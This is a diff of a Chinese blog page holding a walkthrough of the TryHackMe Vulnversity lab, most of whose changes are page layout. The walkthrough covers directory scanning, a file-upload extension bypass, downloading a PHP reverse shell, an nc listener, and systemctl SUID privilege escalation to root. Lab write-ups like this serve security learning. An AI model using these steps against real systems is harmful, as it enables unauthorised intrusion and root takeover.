@@ -12,7 +12,7 @@
 <meta name="generator" content="Hugo 0.69.0-DEV" />
 
 
-<link rel="shortcut icon" href="https://cdn.jsdelivr.net/gh/amzrk2/poal-jsdelivr@1.2.0/favicons/favicon.ico" />
+<link rel="shortcut icon" href="https://cdn.jsdelivr.net/gh/amzrk2/cdn-stcapi@1/favicons/favicon.ico" />
 
 
 <title>靶机渗透测试 TryHackMe:Vulnversity - 深邃之眼</title>
@@ -24,8 +24,27 @@
 <meta name="description" content="A minimal Hugo theme with nice theme color." />
 
 
+<meta name="keywords" content="靶机" />
+
 <meta property="og:title" content="靶机渗透测试 TryHackMe:Vulnversity" />
-<meta property="og:description" content="作者：道明君 博客：https://xeye.io 公众号：深邃之眼 0x00 前言 靶机名称：Vulnversity 靶机简介：Vulnversity靶机主要学习主动侦查扫描，Web应用攻击和suid提权。 攻击路径：" />
+<meta property="og:description" content="0x00 前言
+
+
+靶机名称：Vulnversity
+
+
+靶机简介：Vulnversity靶机主要学习主动侦查扫描，Web应用攻击和suid提权。
+
+
+攻击路径：端口扫描&ndash;&gt;Web目录爆破&ndash;&gt;文件上传漏洞利用&ndash;&gt;权限提升
+
+
+相关工具：nmap、gobuster、burpsuite、nc、webshell
+
+
+难度：容易
+
+" />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="https://xeye.io/post/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95tryhackme-vulnversity/" />
 <meta property="og:image" content="https://xeye.io/img/og.png"/>
@@ -36,7 +55,24 @@
 <meta name="twitter:image" content="https://xeye.io/img/og.png"/>
 
 <meta name="twitter:title" content="靶机渗透测试 TryHackMe:Vulnversity"/>
-<meta name="twitter:description" content="作者：道明君 博客：https://xeye.io 公众号：深邃之眼 0x00 前言 靶机名称：Vulnversity 靶机简介：Vulnversity靶机主要学习主动侦查扫描，Web应用攻击和suid提权。 攻击路径："/>
+<meta name="twitter:description" content="0x00 前言
+
+
+靶机名称：Vulnversity
+
+
+靶机简介：Vulnversity靶机主要学习主动侦查扫描，Web应用攻击和suid提权。
+
+
+攻击路径：端口扫描&ndash;&gt;Web目录爆破&ndash;&gt;文件上传漏洞利用&ndash;&gt;权限提升
+
+
+相关工具：nmap、gobuster、burpsuite、nc、webshell
+
+
+难度：容易
+
+"/>
 
 
 
@@ -56,6 +92,8 @@
 <link rel="stylesheet" href="/assets/css/fuji.min.css" />
 
 
+<script async type="module" src="https://cdn.jsdelivr.net/npm/ionicons@5.0.1/dist/ionicons/ionicons.esm.js"></script>
+<script async nomodule src="https://cdn.jsdelivr.net/npm/ionicons@5.0.1/dist/ionicons/ionicons.js"></script>
 
 
 
@@ -95,7 +133,7 @@
         <div class="col-12 header">
             <a class="title-main" href="https://xeye.io">深邃之眼</a>
             
-            <span class="title-sub">君子有所为有所不为。</span>
+            <span class="title-sub">拨开迷雾看世界</span>
             
         </div>
     </div>
@@ -112,23 +150,28 @@
         <a href="https://xeye.io/post/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95tryhackme-vulnversity/">靶机渗透测试 TryHackMe:Vulnversity</a>
     </h2>
     <div class="post-item post-meta">
-        <span><ion-icon name="today"></ion-icon>&nbsp;2020-04-03</span><span><ion-icon name="file-tray"></ion-icon>&nbsp;1408 words</span><span><ion-icon name="pricetags"></ion-icon>&nbsp;No tag</span>
+        <span><ion-icon name="today"></ion-icon>&nbsp;2020-04-03</span><span><ion-icon name="file-tray"></ion-icon>&nbsp;1376 words</span><span><ion-icon name="pricetags"></ion-icon>&nbsp;<a href="/tags/%E9%9D%B6%E6%9C%BA">靶机</a>&nbsp;</span>
     </div>
     
     
     <div class="post-content markdown-body">
-        <blockquote>
-<p>作者：道明君</p>
-<p>博客：https://xeye.io</p>
-<p>公众号：深邃之眼</p>
-</blockquote>
-<p><strong>0x00 前言</strong></p>
+        <p><strong>0x00 前言</strong></p>
 <ul>
-<li>靶机名称：Vulnversity</li>
-<li>靶机简介：Vulnversity靶机主要学习主动侦查扫描，Web应用攻击和suid提权。</li>
-<li>攻击路径：端口扫描&ndash;&gt;Web目录爆破&ndash;&gt;文件上传漏洞利用&ndash;&gt;权限提升</li>
-<li>相关工具：nmap、gobuster、burpsuite、nc、webshell</li>
-<li>难度：容易</li>
+<li>
+<p>靶机名称：Vulnversity</p>
+</li>
+<li>
+<p>靶机简介：Vulnversity靶机主要学习主动侦查扫描，Web应用攻击和suid提权。</p>
+</li>
+<li>
+<p>攻击路径：端口扫描&ndash;&gt;Web目录爆破&ndash;&gt;文件上传漏洞利用&ndash;&gt;权限提升</p>
+</li>
+<li>
+<p>相关工具：nmap、gobuster、burpsuite、nc、webshell</p>
+</li>
+<li>
+<p>难度：容易</p>
+</li>
 </ul>
 <p><strong>0x01 侦查</strong></p>
 <p><strong>1.nmap 扫描</strong></p>
@@ -241,42 +284,34 @@ gobuster dir -u http://10.10.137.247:3333/ -w /usr/share/wordlists/dirbuster/dir
 <p>发现上传页面</p>
 <pre><code>http://10.10.137.247:3333/internal/
 </code></pre>
-<p><a href="https://user-images.githubusercontent.com/58038111/78397430-c9cfe780-7623-11ea-97b4-eeda9f020c25.png" target="_blank"><a href="https://xeye.io/static/images/20200713150703.png" target="_blank">
-    <img src="https://xeye.io/static/images/20200713150703.png" alt="image" />
-</a></a></p>
-<p><a href="https://user-images.githubusercontent.com/58038111/78397469-d7856d00-7623-11ea-8458-b4928f60e1a2.png" target="_blank"><a href="https://xeye.io/static/images/20200713150719.png" target="_blank">
-    <img src="https://xeye.io/static/images/20200713150719.png" alt="image" />
-</a></a></p>
+<p><a href="https://user-images.githubusercontent.com/58038111/78397430-c9cfe780-7623-11ea-97b4-eeda9f020c25.png" target="_blank"><img class="img-zoomable" src="https://xeye.io/static/images/20200713150703.png" alt="image" />
+</a></p>
+<p><a href="https://user-images.githubusercontent.com/58038111/78397469-d7856d00-7623-11ea-8458-b4928f60e1a2.png" target="_blank"><img class="img-zoomable" src="https://xeye.io/static/images/20200713150719.png" alt="image" />
+</a></p>
 <p><strong>0x03 穷举上传文件扩展名</strong></p>
-<p><a href="https://user-images.githubusercontent.com/58038111/78397548-03085780-7624-11ea-843e-4af58c7ac5be.png" target="_blank"><a href="https://xeye.io/static/images/20200713150753.png" target="_blank">
-    <img src="https://xeye.io/static/images/20200713150753.png" alt="image" />
-</a></a></p>
-<p><a href="https://user-images.githubusercontent.com/58038111/78397689-3e0a8b00-7624-11ea-8f46-004de1cf9b54.png" target="_blank"><a href="https://xeye.io/static/images/20200713150803.png" target="_blank">
-    <img src="https://xeye.io/static/images/20200713150803.png" alt="image" />
-</a></a></p>
+<p><a href="https://user-images.githubusercontent.com/58038111/78397548-03085780-7624-11ea-843e-4af58c7ac5be.png" target="_blank"><img class="img-zoomable" src="https://xeye.io/static/images/20200713150753.png" alt="image" />
+</a></p>
+<p><a href="https://user-images.githubusercontent.com/58038111/78397689-3e0a8b00-7624-11ea-8f46-004de1cf9b54.png" target="_blank"><img class="img-zoomable" src="https://xeye.io/static/images/20200713150803.png" alt="image" />
+</a></p>
 <p>设置Content-Type类型为php</p>
 <pre><code>Content-Type: application/x-php
 </code></pre>
 <p>取消URL默认编码（Payload文件名中的&rdquo;.&ldquo;被URL编码会导致访问失败）</p>
 <pre><code>Burpsuite --&gt; Intruder --&gt; Payloads --&gt; Payload Encoding --&gt; BurpsuitePayload Encoding
 </code></pre>
-<p><a href="https://user-images.githubusercontent.com/58038111/78397736-57abd280-7624-11ea-9864-4834a018a5c5.png" target="_blank"><a href="https://xeye.io/static/images/20200713150820.png" target="_blank">
-    <img src="https://xeye.io/static/images/20200713150820.png" alt="image" />
-</a></a></p>
+<p><a href="https://user-images.githubusercontent.com/58038111/78397736-57abd280-7624-11ea-9864-4834a018a5c5.png" target="_blank"><img class="img-zoomable" src="https://xeye.io/static/images/20200713150820.png" alt="image" />
+</a></p>
 <p>发现可以上传.phhtm</p>
-<p><a href="https://user-images.githubusercontent.com/58038111/78397762-61353a80-7624-11ea-80c0-a44063a0a825.png" target="_blank"><a href="https://xeye.io/static/images/20200713150831.png" target="_blank">
-    <img src="https://xeye.io/static/images/20200713150831.png" alt="image" />
-</a></a></p>
+<p><a href="https://user-images.githubusercontent.com/58038111/78397762-61353a80-7624-11ea-80c0-a44063a0a825.png" target="_blank"><img class="img-zoomable" src="https://xeye.io/static/images/20200713150831.png" alt="image" />
+</a></p>
 <h2 id="0x04-上传webshell">0x04 上传Webshell</h2>
 <pre><code>wget https://github.com/pentestmonkey/php-reverse-shell/raw/master/php-reverse-shell.php -O php-reverse-shell.phtml
 </code></pre>
 <p>反弹IP修改为本机（攻击机）</p>
-<p><a href="https://user-images.githubusercontent.com/58038111/78397775-6a260c00-7624-11ea-843c-357f2b05af34.png" target="_blank"><a href="https://xeye.io/static/images/20200713150844.png" target="_blank">
-    <img src="https://xeye.io/static/images/20200713150844.png" alt="image" />
-</a></a></p>
-<p><a href="https://user-images.githubusercontent.com/58038111/78397793-727e4700-7624-11ea-9429-ed2352309dda.png" target="_blank"><a href="https://xeye.io/static/images/20200713150857.png" target="_blank">
-    <img src="https://xeye.io/static/images/20200713150857.png" alt="image" />
-</a></a></p>
+<p><a href="https://user-images.githubusercontent.com/58038111/78397775-6a260c00-7624-11ea-843c-357f2b05af34.png" target="_blank"><img class="img-zoomable" src="https://xeye.io/static/images/20200713150844.png" alt="image" />
+</a></p>
+<p><a href="https://user-images.githubusercontent.com/58038111/78397793-727e4700-7624-11ea-9429-ed2352309dda.png" target="_blank"><img class="img-zoomable" src="https://xeye.io/static/images/20200713150857.png" alt="image" />
+</a></p>
 <h2 id="0x04-反弹shell">0x04 反弹shell</h2>
 <p>本机NC监听1234端口</p>
 <pre><code> nc -lvnp 1234
@@ -285,14 +320,12 @@ gobuster dir -u http://10.10.137.247:3333/ -w /usr/share/wordlists/dirbuster/dir
 <pre><code>$ cat /home/bill/user.txt
 8bd7992fxxxxxxxxxxxxxxxxxxxxxx
 </code></pre>
-<p><a href="https://user-images.githubusercontent.com/58038111/78397841-8aee6180-7624-11ea-9fe0-a51017f5de30.png" target="_blank"><a href="https://xeye.io/static/images/20200713150908.png" target="_blank">
-    <img src="https://xeye.io/static/images/20200713150908.png" alt="image" />
-</a></a></p>
+<p><a href="https://user-images.githubusercontent.com/58038111/78397841-8aee6180-7624-11ea-9fe0-a51017f5de30.png" target="_blank"><img class="img-zoomable" src="https://xeye.io/static/images/20200713150908.png" alt="image" />
+</a></p>
 <h2 id="0x04-提权">0x04 提权</h2>
 <p>利用SUID提权，搜索所有SUID文件</p>
-<p><a href="https://user-images.githubusercontent.com/58038111/78397885-a0638b80-7624-11ea-8dae-c7ca889e8185.png" target="_blank"><a href="https://xeye.io/static/images/20200713150922.png" target="_blank">
-    <img src="https://xeye.io/static/images/20200713150922.png" alt="image" />
-</a></a></p>
+<p><a href="https://user-images.githubusercontent.com/58038111/78397885-a0638b80-7624-11ea-8dae-c7ca889e8185.png" target="_blank"><img class="img-zoomable" src="https://xeye.io/static/images/20200713150922.png" alt="image" />
+</a></p>
 <pre><code>$ find / -perm -4000 2&gt; /dev/null | xargs ls -lah
 -rwsr-xr-x 1 root   root        31K Jul 12  2016 /bin/fusermount
 -rwsr-xr-x 1 root   root        40K May 16  2018 /bin/mount
@@ -321,9 +354,8 @@ gobuster dir -u http://10.10.137.247:3333/ -w /usr/share/wordlists/dirbuster/dir
 -rwsr-xr-x 1 root   root        75K Jul 17 11:22 /usr/lib/squid/pinger
 -rwsr-xr-x 1 root   root        3
 </code></pre>
-<p><a href="https://user-images.githubusercontent.com/58038111/78397938-bd985a00-7624-11ea-8ec2-acb884811b74.png" target="_blank"><a href="https://xeye.io/static/images/20200713150936.png" target="_blank">
-    <img src="https://xeye.io/static/images/20200713150936.png" alt="image" />
-</a></a></p>
+<p><a href="https://user-images.githubusercontent.com/58038111/78397938-bd985a00-7624-11ea-8ec2-acb884811b74.png" target="_blank"><img class="img-zoomable" src="https://xeye.io/static/images/20200713150936.png" alt="image" />
+</a></p>
 <p>我们看到靶机系统允许所有登陆用户创建系统服务并以root权限运行，systemctl用于控制systemd初始化服务的工具。</p>
 <pre><code>xxx=$(mktemp).service 
 //创建一个名为xxx的环境变量，调用mktemp创建一个临时的systemd服务配置文件
@@ -343,11 +375,9 @@ cat /tmp/output
 a58ffxxxxxxxxxxxxxxxxxxx
 //获得root flag
 </code></pre>
-<p><a href="https://user-images.githubusercontent.com/58038111/78397966-d0ab2a00-7624-11ea-8767-ea046bc138e5.png" target="_blank"><a href="https://xeye.io/static/images/20200713150947.png" target="_blank">
-    <img src="https://xeye.io/static/images/20200713150947.png" alt="image" />
-</a></a></p>
+<p><a href="https://user-images.githubusercontent.com/58038111/78397966-d0ab2a00-7624-11ea-8767-ea046bc138e5.png" target="_blank"><img class="img-zoomable" src="https://xeye.io/static/images/20200713150947.png" alt="image" />
+</a></p>
 <p>systemctl提权参考GTFOBins项目文章：https://gtfobins.github.io/gtfobins/systemctl/#suid</p>
-
     </div>
 </article>
 
@@ -363,21 +393,6 @@ a58ffxxxxxxxxxxxxxxxxxxx
 
             </div>
             <aside class="col-12 col-md-3 float-left sidebar">
-    
-    
-    
-    <div class="sidebar-item sidebar-toc">
-        <h3>TOC</h3>
-        <nav id="TableOfContents">
-  <ul>
-    <li><a href="#0x04-上传webshell">0x04 上传Webshell</a></li>
-    <li><a href="#0x04-反弹shell">0x04 反弹shell</a></li>
-    <li><a href="#0x04-提权">0x04 提权</a></li>
-  </ul>
-</nav>
-    </div>
-    
-    
     
     <div class="sidebar-item sidebar-pages">
         <h3>Pages</h3>
@@ -410,6 +425,18 @@ a58ffxxxxxxxxxxxxxxxxxxx
         <h3>Tags</h3>
         <div>
             
+            <span>
+                <a href="/tags/%E7%BA%A2%E9%98%9F%E7%A0%94%E7%A9%B6/">红队研究</a>
+            </span>
+            
+            <span>
+                <a href="/tags/%E9%98%85%E8%AF%BB/">阅读</a>
+            </span>
+            
+            <span>
+                <a href="/tags/%E9%9D%B6%E6%9C%BA/">靶机</a>
+            </span>
+            
         </div>
     </div>
     
@@ -431,6 +458,20 @@ a58ffxxxxxxxxxxxxxxxxxxx
             
         </ul>
     </div>
+    
+    
+    
+    <div class="sidebar-item sidebar-toc">
+        <h3>TOC</h3>
+        <nav id="TableOfContents">
+  <ul>
+    <li><a href="#0x04-上传webshell">0x04 上传Webshell</a></li>
+    <li><a href="#0x04-反弹shell">0x04 反弹shell</a></li>
+    <li><a href="#0x04-提权">0x04 提权</a></li>
+  </ul>
+</nav>
+    </div>
+    
     
 </aside>
         </div>
@@ -455,12 +496,10 @@ a58ffxxxxxxxxxxxxxxxxxxx
     </div>
 </footer>
     
-    <script async type="module" src="https://cdn.jsdelivr.net/npm/ionicons@5.0.1/dist/ionicons/ionicons.esm.js"></script>
-<script async nomodule src="https://cdn.jsdelivr.net/npm/ionicons@5.0.1/dist/ionicons/ionicons.js"></script>
-
+    
+<script defer src="https://cdn.jsdelivr.net/combine/npm/medium-zoom@1.0.5,npm/lazysizes@5.2.2"></script>
 <script defer src="https://cdn.jsdelivr.net/npm/prismjs@1.20.0/components/prism-core.min.js"></script>
 <script defer src="https://cdn.jsdelivr.net/npm/prismjs@1.20.0/plugins/autoloader/prism-autoloader.min.js"></script>
-<script defer src="https://cdn.jsdelivr.net/npm/lazysizes@5.2.2/lazysizes.min.js"></script>
 
 <script defer src="/assets/js/fuji.min.js"></script>
 
